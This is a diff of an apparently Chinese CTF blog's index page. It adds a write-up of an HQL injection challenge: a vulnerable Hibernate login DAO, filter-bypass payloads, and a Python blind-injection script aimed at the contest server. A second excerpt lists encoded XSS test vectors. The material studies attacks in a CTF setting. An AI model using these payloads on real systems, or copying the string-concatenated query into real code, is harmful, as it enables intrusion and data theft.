+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cuitctf.dao.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cuitctf.dao.UserDao;</span><br><span class="line"><span class="keyword">import</span> com.cuitctf.po.User;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> org.springframework.orm.hibernate3.HibernateTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.orm.hibernate3.support.HibernateDaoSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDaoImpl</span> <span class="keyword">extends</span> <span class="title">HibernateDaoSupport</span></span></span><br><span class="line"><span class="class">  <span class="keyword">implements</span> <span class="title">UserDao</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">findUserByName</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getHibernateTemplate().find(<span class="string">"from User where name ='"</span> + name + <span class="string">"'"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">loginCheck</span><span class="params">(String name, String password)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> getHibernateTemplate().find(<span class="string">"from User where name ='"</span> + name + <span class="string">"' and password = '"</span> + password + <span class="string">"'"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> List &lt;User&gt; loginCheck(String name, String password) &#123;</span><br><span class="line">    name = name.replaceAll(<span class="string">" "</span>, <span class="string">""</span>);</span><br><span class="line">    name = name.replaceAll(<span class="string">"="</span>, <span class="string">""</span>);</span><br><span class="line">    Matcher username_matcher = Pattern.compile(<span class="string">"^[0-9a-zA-Z]+$"</span>).matcher(name);</span><br><span class="line">    Matcher password_matcher = Pattern.compile(<span class="string">"^[0-9a-zA-Z]+$"</span>).matcher(password);</span><br><span class="line">    <span class="keyword">if</span> (password_matcher.find()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.userDao.loginCheck(name, password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看出文件逻辑是只对username空格和等号过滤，password匹配上就可以</p>
+<p>所以产生了注入。</p>
+<p>但是由于Hibernate是通过映射实体到数据库进行查询的，所以不全是SQL注入。查询资料发现，是HQL注入</p>
+<h3 id="HQL-vs-SQL"><a href="#HQL-vs-SQL" class="headerlink" title="HQL vs SQL"></a>HQL vs SQL</h3><blockquote>
+<p>HQL 查询语句是面向对象的, Hibernate 负责解析 HQL 查询语句, 然后根据对象-关系映射文件中的映射信息, 把 HQL 查询语句翻译成相应的 SQL 语句。HQL 查询语句中的主体是域模型中的类(库表)及类的属性(字段信息)。</p>
+<p>SQL 查询语句是与关系数据库绑定在一起的。SQL 查询语句中的主体是数据库表及表的字段。</p>
+</blockquote>
+<p><a href="http://tracylihui.github.io/2015/07/08/Hibernate%EF%BC%9A%E6%B7%B1%E5%85%A5HQL%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">关于HQL语句的学习可以看这篇page</a></p>
+<p>没有在xml中做映射的表是无法查询的，未映射的列也是无法查询的。如果读不到hibernate.cfg.xml的内容，常常会发现自己几乎连数据拓扑结构都猜不对，也就是说HQL是有很大限制的。</p>
+<p>并且只能够盲注，因为HQL注入的原理和SQL注入不太一样，它将注入语句也作为正常语句查询，并不打断原有逻辑(不加引号)</p>
+<p>先手注测试一下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> schema.table <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>)&gt;n <span class="comment">--' and '1'='1</span></span><br></pre></td></tr></table></figure>
+<p>空格和等号分别可以用%0a和like绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'%0aor%0a(<span class="keyword">select</span>%<span class="number">0</span>asubstring(welcometoourctf,<span class="number">1</span>,<span class="number">1</span>)%<span class="number">0</span>afrom%<span class="number">0</span>aFlag)%<span class="number">0</span>alike%<span class="number">0</span>a<span class="string">'a'</span>%<span class="number">0</span>aand%<span class="number">0</span>a<span class="string">'1'</span><span class="keyword">like</span><span class="string">'1</span></span><br></pre></td></tr></table></figure>
+<p>最后的exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://121.196.195.244:9032/zhuanxvlogin"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    p=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        payload=<span class="string">"(select%0aascii(substr(id,"</span>+str(i)+<span class="string">",i))%0afrom%0afrom%0aflag%0awhere%0aid&lt;2)&lt;'"</span>+str(j)+<span class="string">"'"</span></span><br><span class="line">        url = <span class="string">"http://121.196.195.244:9032/zhuanxvlogin?user.name=admin'%0Aor%0A"</span> + payload + <span class="string">"%0Aor%0Aname%0Alike%0A'admin&amp;user.password=1"</span></span><br><span class="line">        r1=s.get(url)</span><br><span class="line">        <span class="keyword">if</span> len(r1.text)&gt;<span class="number">20000</span> <span class="keyword">and</span> p!=<span class="string">''</span>:</span><br><span class="line">            flag+=p</span><br><span class="line">            <span class="keyword">print</span> i,flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p=chr(j)</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -257,7 +576,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-26T21:56:46+08:00">
                 2018-05-26
@@ -734,7 +1053,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-13T00:13:42+08:00">
                 2018-05-13
@@ -853,7 +1172,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-10T22:51:33+08:00">
                 2018-05-10
@@ -972,7 +1291,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-22T13:04:24+08:00">
                 2018-04-22
@@ -1028,7 +1347,7 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/04/22/DDCTF web1/#more" rel="contents">
-              Weiterlesen &raquo;
+              Lire la suite &raquo;
             </a>
           </div>
           <!--/noindex-->
@@ -1107,7 +1426,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-19T16:33:00+08:00">
                 2018-04-19
@@ -1151,7 +1470,7 @@
           <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01    前言"></a>0x01    前言</h2><p>对于B/S架构的数据流程一直不是很了解，所以学习一波。看看这之中的编码、解码形式以及处理机制与原理，便于对以后前端安全的继续学习。</p>
 <h2 id="0x02-编码"><a href="#0x02-编码" class="headerlink" title="0x02 编码"></a>0x02 编码</h2><p>基础部分：<br>先来上几个编码，这几个脚本能够执行吗：</p>
 <h3 id="基础部分"><a href="#基础部分" class="headerlink" title="基础部分"></a>基础部分</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>	</span><br><span class="line">URL 编码 "javascript:alert(1)"</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29"</span>&gt;</span></span><br><span class="line">HTML字符实体编码 "javascript" 和 URL 编码 "alert(2)"</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript%3aalert(3)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">URL 编码 ":"</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">HTML字符实体编码 <span class="tag">&lt; 和 &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">HTML字符实体编码 <span class="tag">&lt; 和 &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(6)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="高级部分"><a href="#高级部分" class="headerlink" title="高级部分"></a>高级部分</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('7&amp;#39;);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">HTML字符实体编码 " ' " （单引号）</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('8\u0027);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">Unicode编码 " ' " （单引号）</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">HTML字符实体编码 alert(9);</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(10);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode 编码 alert</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode 编码 alert(11)</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode 编码 alert 和 12</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode 编码 " ' " （单引号）</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('14\u000a')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode 编码换行符（0x0A）</span><br></pre></td></tr></table></figure>
+<h3 id="高级部分"><a href="#高级部分" class="headerlink" title="高级部分"></a>高级部分</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('7&amp;#39;);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">HTML字符实体编码 " ' " （单引号）</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('8\u0027);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">Unicode编码 " ' " （单引号）</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">HTML字符实体编码 alert(9);</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(10);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode 编码 alert</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode 编码 alert(11)</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode 编码 alert 和 12</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode 编码 " ' " （单引号）</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'14\u000a'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode 编码换行符（0x0A）</span><br></pre></td></tr></table></figure>
 <h3 id="额外赠送"><a href="#额外赠送" class="headerlink" title="额外赠送"></a>额外赠送</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>问题答案参见    此处[<a href="http://test.attacker-domain.com/browserparsing/answers.txt]" target="_blank" rel="noopener">http://test.attacker-domain.com/browserparsing/answers.txt]</a><br>此处为    测试页面[<a href="http://test.attacker-domain.com/browserparsing/tests.html]" target="_blank" rel="noopener">http://test.attacker-domain.com/browserparsing/tests.html]</a>     </p>
 <p>解析HTML文档时主要有三个处理过程：</p>
@@ -1214,7 +1533,7 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/04/19/深入理解浏览器的解析机制/#more" rel="contents">
-              Weiterlesen &raquo;
+              Lire la suite &raquo;
             </a>
           </div>
           <!--/noindex-->
@@ -1293,7 +1612,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-10T22:18:38+08:00">
                 2018-04-10
@@ -1366,7 +1685,7 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/04/10/The POC of RPO/#more" rel="contents">
-              Weiterlesen &raquo;
+              Lire la suite &raquo;
             </a>
           </div>
           <!--/noindex-->
@@ -1445,7 +1764,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-02T20:26:19+08:00">
                 2018-04-02
@@ -1499,7 +1818,7 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/04/02/网强杯wp的学习/#more" rel="contents">
-              Weiterlesen &raquo;
+              Lire la suite &raquo;
             </a>
           </div>
           <!--/noindex-->
@@ -1578,7 +1897,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posté le</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-02T10:56:25+08:00">
                 2018-04-02
@@ -1678,141 +1997,13 @@ print s.[:point]
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/31/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ratten3anger">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ratten3anger">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/31/hello-world/" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-31T12:56:41+08:00">
-                2018-03-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/03/31/hello-world/#more" rel="contents">
-              Weiterlesen &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -1856,8 +2047,8 @@ print s.[:point]
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">9</span>
-                  <span class="site-state-item-name">Artikel</span>
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">articles</span>
                 </a>
               </div>
             
@@ -1870,7 +2061,7 @@ print s.[:point]
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
                   <span class="site-state-item-count">6</span>
-                  <span class="site-state-item-name">Tags</span>
+                  <span class="site-state-item-name">tags</span>
                 </a>
               </div>
             
@@ -1946,7 +2137,7 @@ print s.[:point]
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
 
@@ -1954,7 +2145,7 @@ print s.[:point]
 
 
 
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+  <div class="theme-info">Thème &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
 
 
 
